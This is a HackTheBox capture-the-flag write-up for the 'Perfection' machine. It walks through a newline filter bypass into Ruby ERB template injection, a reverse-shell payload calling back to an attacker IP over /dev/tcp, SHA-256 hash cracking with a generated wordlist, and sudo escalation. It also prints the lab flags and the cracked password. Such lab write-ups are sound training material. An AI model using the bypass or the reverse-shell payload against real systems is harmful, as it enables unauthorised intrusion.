---
layout: post
title: "HTB Write-Up: Perfection"
Author: Pedro Pereira
date: 2026-04-21
categories: [HackTheBox, Easy, Linux]
tags: [SSTI, Ruby, Sinatra, hashcat, sudo]
---

# HackTheBox — Perfection

**Difficulty:** Easy  
**OS:** Linux  
**Topics:** Server-Side Template Injection (SSTI), Ruby ERB, Custom Wordlist Generation, Hash Cracking

---

## Summary

Perfection is a Linux machine hosting a Ruby-based web application (Sinatra + WEBrick) that implements a weighted grade calculator. The application attempts to block malicious input, but the filter can be bypassed using a URL-encoded newline character, allowing Server-Side Template Injection via Ruby's ERB syntax. After gaining a shell, privilege escalation is achieved by finding a SQLite database with password hashes and an email that leaks the password format, enabling a targeted hashcat attack that leads to full sudo access.
I completed this machine on 18/03/2024 and decided to write a walkthrough hopefully so it helps you understand a fellow pentester's thought process.

---

## Enumeration

### Port Scanning

```bash
nmap -sC -sV -p- 10.10.11.253
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
        http-title: Weighted Grade Calculator
```

Two ports open: SSH on 22 and an nginx web server on port 80. The OS is Linux, likely Ubuntu based on the OpenSSH banner.

### Directory Enumeration

```bash
gobuster dir -u 10.10.11.253 -w /usr/share/wordlists/dirb/common.txt -t 50
```
<img width="626" height="321" alt="image" src="https://github.com/user-attachments/assets/faac712c-5862-4870-b9e9-c47738690998" />


Nothing useful came out of directory enumeration, which I regreted not going more in depth on it because I got stuck for a long time in the next part. You will see!!!

---

## Web Application Reconnaissance

### Landing Page

The application is a **Weighted Grade Calculator** powered by **WEBrick 1.7.0**.

<img width="739" height="360" alt="image" src="https://github.com/user-attachments/assets/cf839f62-4ebd-4b7e-991e-2700a44ace83" />


Here my imediate thought was "This will be possible to exploit via Code injection of some sort". So I've tried it.

### Input Filtering

When injecting code into the calculator fields, the application returns:

```
Malicious Input Blocked
```

<img width="779" height="315" alt="image" src="https://github.com/user-attachments/assets/e5c28320-2dff-49f5-a140-eb34f676eec5" />


Testing various payloads through Burp Suite confirmed the filter blocks common injection patterns:

```sql
' OR '1'='1
```
```javascript
<script>Alert(1)</script>
```
```
%3Cscript%3EAlert(1)%3C%2Fscript%3E
```

All returned the "Malicious Input Blocked" response.

<img width="1363" height="595" alt="image" src="https://github.com/user-attachments/assets/26d897e8-d102-46dd-8167-b9ba22444cee" />

### Sinatra Framework

At this point I was stuck... and... Remember me saying that I should have enumerate a litte more on the directory busting? Well, on a whim I tested /admin as it is a common page, and voilá...

<img width="1164" height="426" alt="image" src="https://github.com/user-attachments/assets/0903ecb7-f4d8-454f-82ca-d9eec3c7ebb1" />


Navigating to `/admin` returns an error that reveals the application is running on the **Sinatra** framework, which uses Ruby.
This gave me the necessary information to know what to do next and learn that **you should always go back to enumeration when you find yourself at dead ends**.

### Server-Side Template Injection (SSTI)

Since the application is built on Sinatra (Ruby) and WEBrick, and ERB (Embedded Ruby) is a commonly used templating engine, the following payload was tested:

```ruby
<%= File.open('/etc/passwd').read %>
```

But this would result in **Malicious Input Blocked** message. So we need to evade those filters.

After further testing, it turned out that the filter only validates the first line of the input. By URL-encoding a newline character (`%0A`)and prepending it with any character (`N%0A`), the filter can be bypassed, allowing special characters on the following line to be processed.

<img width="1640" height="461" alt="image" src="https://github.com/user-attachments/assets/c378d1cc-7f9e-4e9a-a71c-81100a62b94e" />


As you see above, it doesn't throw back the **Malicious Input Blocked** which means we bypass the filter. Now we can try the ruby payload again with the URL encoding:

<img width="1379" height="789" alt="image" src="https://github.com/user-attachments/assets/e4e25939-5880-4f5c-886a-4de60ad8e910" />


The `/etc/passwd` file is returned in the response, confirming **Ruby ERB SSTI**.

---

## Exploitation — Initial Foothold

With confirmed SSTI, the next step was somehow getting a reverse shell. This initial exploitation was actually very straight forward since we can use the same ERB syntax to execute system commands:

```ruby
<% system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.54/1234 0>&1'") %>
```

The full URL-encoded payload sent via Burp Suite (note the `N%0A` prefix to bypass the filter):

```
N%0A%3C%25%20system(%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.54%2F1234%200%3E%261'%22)%20%25%3E
```

Setting up the listener on the attacker machine:

```bash
nc -lvp 1234
```

After sending the payload via burpsuite as shown before, we get a shell for the user susan:

<img width="637" height="196" alt="image" src="https://github.com/user-attachments/assets/3404d5ba-63d4-4f6d-9610-2d51dd10123e" />

**User flag:**
```
fb2f98f00238c1f11aa55beb28a6613d
```

> **Reference in case you are interested in the SSTI attack:** [HackTricks — SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

## Privilege Escalation

### System Enumeration with Linpeas

On a normal pentesting assessement I wouldn't blindly run linpeas as this raises a lot of alerts, but being a CTF, this actually is the quickest path.
Running `linpeas.sh` on the target, it highlighted two interesting paths:

```
/var/mail/susan
/home/susan/Migration/pupilpath_credentials.db
```

### Reading the Email

The email in `/var/mail/susan` was sent by **Tina** and revealed the password format policy in use:

<img width="1011" height="230" alt="image" src="https://github.com/user-attachments/assets/c57d97df-62b7-48e3-a4cd-0af0d3fdf68e" />

The format is:
```
{firstname}_{firstname backwards}_{random integer between 1 and 1,000,000,000}
```

### Extracting the Database

Opening the SQLite database found at `/home/susan/Migration/pupilpath_credentials.db`:

<img width="809" height="380" alt="image" src="https://github.com/user-attachments/assets/d26bd8bc-72ab-4cfb-b328-73b5df89623e" />

```
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

The hashes are SHA2-256. The target is **Susan Miller**. 
Although, we already have access to her account, it will be better if we get her password and get a good ssh shell. It will help us run any command that susan might have sudo but requires password.

### Generating a Custom Wordlist

Given the password format, the search space is too large for a generic wordlist. Instead, a targeted wordlist was generated using a C program (which compiles faster):

```c
#include <stdio.h>

int main() {
    const char* prefix = "susan_nasus_";
    const int MAX_NUMBER = 1000000000;

    for (int i = 1; i <= MAX_NUMBER; i++) {
        printf("%s%d\n", prefix, i);
    }

    return 0;
}
```

Compile and pipe output to a file:

```bash
gcc wordlist.c -o wordlist
./wordlist > wordlist.txt
```

### Cracking the Hash

Using the hashcat -m 1400 (SHA2-256), we were able to quickly crack the password.

```bash
hashcat -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f wordlist.txt
```

<img width="734" height="383" alt="image" src="https://github.com/user-attachments/assets/837ab2b4-53b4-4ee3-a790-583d296bcf39" />

```
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

**Password:** `susan_nasus_413759210`

### Root Access

Now that we have a proper shell, we need to privilege escalation to root.
First thing I like to do is, verifying which permissions my current user has:

```bash
sudo -l
```

<img width="1023" height="118" alt="image" src="https://github.com/user-attachments/assets/629187a5-de3b-435a-a305-c9518e9d14b2" />

Seems like the user can run everything as root, which left a sour taste in my mouth. I WAS GETTING INTO IT!!!

Running a simple:

```bash
sudo su -
```
We get root shell! YEY!!!

<img width="280" height="42" alt="image" src="https://github.com/user-attachments/assets/8347822a-500d-4b14-b88f-b0f9c1bf8ffe" />

<img width="366" height="51" alt="image" src="https://github.com/user-attachments/assets/2676de5d-bd22-48d7-9307-f86954f9eb99" />

**Root flag:**
```
50ce9fc58f9d94a4277126411761cd7d
```
---

## Vulnerability Summary

| Step | Vulnerability | Impact |
|---|---|---|
| Initial Access | SSTI via Ruby ERB (filter bypass with `%0A`) | Remote Code Execution |
| Privilege Escalation | Weak password policy + leaked format via email | Full system compromise |

---
